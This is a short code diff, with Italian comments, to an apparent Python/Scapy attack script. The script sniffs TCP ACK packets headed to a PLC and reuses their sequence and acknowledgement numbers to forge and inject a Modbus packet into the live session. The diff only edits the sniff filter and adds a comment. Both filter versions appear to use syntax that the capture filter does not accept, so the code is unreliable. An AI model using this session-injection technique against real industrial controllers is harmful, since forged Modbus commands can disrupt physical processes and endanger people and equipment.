@@ -6,7 +6,7 @@ from modbuspkt import Modbus, ModbusTCP
 
 while True:
     # cattura un tcp ack diretto verso il plc
-    tcp_ack = sniff(iface="eth1", filter="dst host 10.0.0.22 and tcp and tcp.syn 0 and tcp.ack 1", count=1)
+    tcp_ack = sniff(iface="eth1", filter="dst host 10.0.0.22 and tcp and tcp.flags.syn==0 and tcp.flags.ack==1", count=1)
     
     print(" ----- TCP ACK ----- ")
     tcp_ack.show()
@@ -24,6 +24,7 @@ while True:
     }
     
     # genera un pacchetto modbus con seq e ack dell'ack catturato
+    # e livelli modbustcp, modbus ottenuti da un altro python.
     payload = IP(src=tcpdata['src'], dst=tcpdata['dst']) / \
             	TCP(sport=tcpdata['sport'], dport=tcpdata['dport'], \
             	flags="PA", window=tcpdata['wnd'], seq=tcpdata['seq'], ack=tcpdata['ack'])            
